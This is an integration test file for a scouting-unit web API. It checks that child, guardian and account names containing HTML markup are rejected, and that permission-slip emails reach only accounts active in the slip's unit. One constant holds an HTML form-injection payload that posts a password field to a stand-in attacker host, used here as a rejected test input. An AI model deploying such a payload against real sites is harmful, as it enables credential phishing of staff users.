'use strict';

/**
 * What families write, and who hears about it.
 *
 * - Names never hold `<` or `>`: a child's, a guardian's or an account's name
 *   is shown on staff screens, and markup in one could lay a form over them.
 * - A permission slip's email (and its reminder) goes to accounts active in
 *   the slip's unit. user_participants has no unit, so an account linked to
 *   the same child only through another unit must not receive this unit's
 *   activity and signing link.
 */

const express = require('express');
const request = require('supertest');
const { Pool } = require('pg');
const { randomUUID } = require('crypto');
require('./jest-conditional-helpers');
process.env.JWT_SECRET_KEY ||= 'family-input-integration-secret';

// Capture mail instead of sending it.
jest.mock('../utils/index', () => ({
  ...jest.requireActual('../utils/index'),
  sendEmail: jest.fn().mockResolvedValue(true),
  getUserEmailLanguage: jest.fn().mockResolvedValue('fr'),
}));
const { sendEmail } = require('../utils/index');

const { signJWTToken } = require('../utils/jwt-config');
const { grantParticipantAccess, ACCESS_SOURCE } = require('../services/participantAccess');

const DATABASE_URL = process.env.TEST_DATABASE_URL;
const FORM_NAME = '<form action="https://evil.example/x"><input name="password"></form>';
const logger = { info: jest.fn(), warn: jest.fn(), error: jest.fn(), debug: jest.fn() };

describe.skipIf(!DATABASE_URL)('Family input', () => {
  let pool;
  let app;
  const ids = {};

  async function one(sql, params = []) {
    const result = await pool.query(sql, params);
    return Object.values(result.rows[0] || {})[0];
  }

  async function unit(label) {
    const client = await pool.connect();
    try {
      await client.query('BEGIN');
      const id = (await client.query('INSERT INTO organizations (name) VALUES ($1) RETURNING id', [label])).rows[0].id;
      await client.query("INSERT INTO organization_program_sections (organization_id, section_key, display_name) VALUES ($1, 'general', 'General')", [id]);
      await client.query('COMMIT');
      await pool.query("INSERT INTO scout_years (organization_id, label, start_date, end_date, status) VALUES ($1, '2026-2027', '2026-09-01', '2027-08-31', 'active')", [id]);
      return id;
    } finally {
      client.release();
    }
  }

  async function role(keys, scope) {
    const id = await one('INSERT INTO roles (role_name, display_name, data_scope) VALUES ($1, $1, $2) RETURNING id',
      [`family_input_${randomUUID()}`, scope]);
    await pool.query('INSERT INTO role_permissions (role_id, permission_id) SELECT $1, id FROM permissions WHERE permission_key = ANY($2::text[])',
      [id, keys]);
    return id;
  }

  async function member(roleId, organizationId, name) {
    const id = await one("INSERT INTO users (email, password, full_name) VALUES ($1, 'x', $2) RETURNING id",
      [`${randomUUID()}@example.test`, name]);
    await pool.query("INSERT INTO user_organizations (user_id, organization_id, role_ids, status) VALUES ($1, $2, $3::jsonb, 'active')",
      [id, organizationId, JSON.stringify([roleId])]);
    return id;
  }

  function as(userId, organizationId = ids.unit) {
    // The JWT claims nothing useful; the database grants keys.
    return `Bearer ${signJWTToken({ user_id: userId, organizationId, roleNames: [], permissions: [] })}`;
  }

  beforeAll(async () => {
    pool = new Pool({ connectionString: DATABASE_URL });
    ids.unit = await unit('Family input unit');
    ids.elsewhere = await unit('Family input other unit');
    const familyRole = await role(['participants.view', 'participants.create_own'], 'linked');
    const staffRole = await role(['communications.send', 'activities.view'], 'organization');
    ids.family = await member(familyRole, ids.unit, 'Family Account');
    ids.staff = await member(staffRole, ids.unit, 'Staff Account');
    ids.outsider = await member(familyRole, ids.elsewhere, 'Outside Unit');

    ids.child = await one("INSERT INTO participants (first_name, last_name, date_naissance) VALUES ('Léa', 'Input', '2016-01-01') RETURNING id");
    await pool.query(`INSERT INTO participant_enrollments (participant_id, organization_id, scout_year_id)
      SELECT $1, $2, id FROM scout_years WHERE organization_id = $2 AND status = 'active'`, [ids.child, ids.unit]);
    await grantParticipantAccess(pool, { participantId: ids.child, userId: ids.family, sourceType: ACCESS_SOURCE.DIRECT });
    // The same child, linked to an account only through another unit.
    await grantParticipantAccess(pool, { participantId: ids.child, userId: ids.outsider, sourceType: ACCESS_SOURCE.DIRECT });

    app = express();
    app.use(express.json());
    app.locals.pool = pool;
    app.use('/api/v1/parent-onboarding', require('../routes/parentOnboarding')(pool, logger));
    app.use('/api/v1/guardians', require('../routes/guardians')(pool, logger));
    app.use('/api/v1/users/me', require('../routes/userProfile')(pool, logger));
    app.use('/api/v1/resources', require('../routes/resources')(pool));
  });

  afterAll(async () => {
    if (!pool) {return;}
    await pool.query('DELETE FROM permission_slips WHERE organization_id = $1', [ids.unit]);
    await pool.end();
  });

  describe('names never carry markup', () => {
    test('a family cannot register a child named as markup', async () => {
      const response = await request(app).post('/api/v1/parent-onboarding/children')
        .set('Authorization', as(ids.family))
        .send({ first_name: FORM_NAME, last_name: 'Input', date_naissance: '2017-02-03' });
      expect(response.status).toBe(400);
    });

    test('nor rename its child that way', async () => {
      const response = await request(app).put(`/api/v1/parent-onboarding/children/${ids.child}`)
        .set('Authorization', as(ids.family))
        .send({ first_name: 'Léa', last_name: '<b>Input</b>', date_naissance: '2016-01-01' });
      expect(response.status).toBe(400);
      const stored = await one('SELECT last_name FROM participants WHERE id = $1', [ids.child]);
      expect(stored).toBe('Input');
    });

    test('nor save a guardian or an account name with markup', async () => {
      const guardian = await request(app).post('/api/v1/guardians')
        .set('Authorization', as(ids.family))
        .send({ participant_id: ids.child, nom: 'Input', prenom: FORM_NAME, lien: 'Mère' });
      expect(guardian.status).toBe(400);

      const account = await request(app).patch('/api/v1/users/me/name')
        .set('Authorization', as(ids.family))
        .send({ firstName: FORM_NAME, lastName: 'Account' });
      expect(account.status).toBe(400);
      expect(await one('SELECT full_name FROM users WHERE id = $1', [ids.family])).toBe('Family Account');
    });

    test('ordinary names, accents and hyphens included, still pass', async () => {
      const response = await request(app).post('/api/v1/parent-onboarding/children')
        .set('Authorization', as(ids.family))
        .send({ first_name: 'Zoé-Anne', last_name: "O'Brien", date_naissance: '2017-02-03' });
      expect(response.status).toBe(201);
    });
  });

  test('a permission slip is emailed only to accounts active in its unit', async () => {
    await pool.query(`INSERT INTO permission_slips
        (organization_id, participant_id, meeting_date, status, email_sent, activity_title)
      VALUES ($1, $2, '2026-10-24', 'pending', false, 'Camp')`, [ids.unit, ids.child]);
    sendEmail.mockClear();

    const response = await request(app).post('/api/v1/resources/permission-slips/send-emails')
      .set('Authorization', as(ids.staff))
      .send({ meeting_date: '2026-10-24' });

    expect(response.status).toBe(200);
    const recipients = sendEmail.mock.calls.map(([to]) => to);
    const outsiderEmail = await one('SELECT email FROM users WHERE id = $1', [ids.outsider]);
    const familyEmail = await one('SELECT email FROM users WHERE id = $1', [ids.family]);
    expect(recipients).toContain(familyEmail);
    expect(recipients).not.toContain(outsiderEmail);
  });
});
